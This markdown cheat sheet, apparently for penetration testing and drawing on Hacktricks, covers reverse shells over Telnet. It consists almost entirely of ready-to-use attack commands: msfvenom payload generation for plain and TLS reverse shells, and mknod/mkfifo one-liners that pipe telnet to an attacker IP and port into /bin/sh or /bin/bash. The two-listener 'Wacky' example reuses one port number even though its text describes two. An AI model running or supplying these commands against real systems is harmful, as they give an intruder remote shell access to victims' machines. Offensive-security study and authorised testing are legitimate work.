# Telnet

## 01 - Generate a payload via `msfvenom`

### 1.1 - TCP Method

```
$ msfvenom -p cmd/unix/reverse shellpath=/bin/sh [telnetpath=/path/to/telnet] lhost=<IP> lport=<PORT>
```

### 1.2 - TLS Method

You can include TLS certificate to encrypt communication.

```
$ msfvenom -p cmd/unix/reverse_ssl_double_telnet shellpath=/bin/sh [telnetpath=/path/to/telnet] handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

Generate a reverse shell telnet via bash prompt.

```
$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

## 02 - One-liners

### 2.1 - `mknod`

```
$ mknod backpipe p && telnet <attacker_IP> <attacker_PORT> 0<backpipe | /bin/bash 1>backpipe; rm -f backpipe
```

### 2.2 - `mkfifo`

```
$ mkfifo /tmp/f && telnet <attacker_IP> <attacker_PORT> 0</tmp/f | /bin/sh 1>/tmp/f; rm -f /tmp/f

$ TF=$(mktemp -u); mkfifo $TF && telnet <attacker_IP> <attacker_PORT> 0<$TF | /bin/sh 1>$TF; rm -f $TF
```

### 2.3 - Wacky

Open two listeners of `netcat`. The first port is for sending commands and the second is for the output.

```
$ telnet <attacker_IP> <attacker_PORT_1>  | /bin/sh | telnet <attacker_IP> <attacker_PORT_1>

$ telnet <attacker_IP> <attacker_PORT_1>  | /bin/bash | telnet <attacker_IP> <attacker_PORT_1>
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/shells/shells/linux.html)